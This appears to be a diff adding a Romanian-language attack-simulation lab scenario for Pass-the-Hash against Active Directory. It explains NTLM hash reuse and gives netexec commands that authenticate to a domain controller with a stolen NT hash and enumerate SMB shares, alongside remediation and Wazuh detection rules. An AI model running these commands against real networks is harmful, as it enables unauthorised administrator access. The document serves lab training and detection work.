@@ -1,0 +1,87 @@
+id: pass_the_hash
+name: Pass-the-Hash
+category: lateral_movement
+mitre: T1550.002
+
+description: |
+  Pass-the-Hash (PtH) abuzeaza protocolul NTLM care nu verifica parola
+  in clar, ci hash-ul NT. Atacatorul foloseste direct hash-ul obtinut
+  (ex. din DCSync) pentru a se autentifica ca acel utilizator fara sa
+  cunoasca parola.
+
+  Fluxul NTLM: serverul trimite un challenge random → clientul calculeaza
+  HMAC-MD5(NT_hash, challenge) → serverul verifica raspunsul. Hash-ul e
+  suficient pentru a calcula raspunsul corect — parola plaintext nu e
+  niciodata necesara in protocol.
+
+  Practic, daca ai hash-ul NT al Administrator-ului din DCSync, te poti
+  autentifica si executa comenzi remote pe DC ca si cum ai sti parola.
+
+  Tool Kali: netexec
+
+misconfiguration_general: |
+  Medii Windows fara Credential Guard sau Protected Users group activat
+  permit reutilizarea hash-urilor NTLM capturate. NTLM ramane activat
+  by default pe Windows pentru compatibilitate cu sisteme mai vechi.
+
+misconfiguration_specific: |
+  Hash-ul NT al contului Administrator obtinut prin DCSync:
+  Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NT_hash>:::
+
+  Formatul DCSync: username:RID:LM_hash:NT_hash
+  NT_hash = ultimii 32 de caractere hex inainte de :::
+  LM_hash (aad3b435...) = valoare dummy, LM dezactivat pe Windows modern
+
+  it.admin este in Domain Admins si a permis DCSync → hash-ul
+  Administrator obtinut poate fi folosit imediat pentru PtH.
+
+remediation: |
+  1. Activeaza Protected Users Security Group pentru conturile privilegiate:
+     Add-ADGroupMember -Identity "Protected Users" -Members "Administrator"
+     Membrii grupului nu se pot autentifica prin NTLM — forteaza Kerberos.
+
+  2. Implementeaza LAPS (Local Administrator Password Solution) — parole
+     unice si rotite automat per masina, limiteaza lateral movement.
+
+  4. Monitorizeaza autentificarile NTLM remote (Event ID 4624 Type 3) pe
+     conturi privilegiate — surse neobisnuite sau in afara orelor de lucru.
+
+parameters:
+  - name: dc_ip
+    label: "IP Domain Controller"
+    default: "10.10.128.2"
+    required: true
+  - name: domain
+    label: "Domeniul AD (FQDN)"
+    default: "corp.local"
+    required: true
+  - name: username
+    label: "Utilizatorul tinta"
+    default: "Administrator"
+    required: true
+  - name: nt_hash
+    label: "Hash NT (din DCSync — ultimii 32 hex)"
+    default: ""
+    required: true
+
+steps:
+  - run_on: kali
+    description: "Verifica autentificarea cu hash-ul NT via netexec"
+    command: "netexec smb {{dc_ip}} -u {{username}} -H {{nt_hash}} 2>&1"
+    expect_nonzero_ok: true
+
+  - run_on: kali
+    description: "Listeaza share-urile SMB accesibile ca Administrator"
+    command: "netexec smb {{dc_ip}} -u {{username}} -H {{nt_hash}} --shares 2>&1"
+    expect_nonzero_ok: true
+
+detection:
+  wazuh_rules:
+    - id: 92652
+      description: "Successful Remote Logon via NTLM - posibil Pass-the-Hash"
+    - id: 67028
+      description: "Special privileges assigned to new logon (Event ID 4672)"
+    - id: 60106
+      description: "Windows Logon Success"
+  mitre_technique: T1550.002
+  mitre_description: "Use Alternate Authentication Material: Pass the Hash"
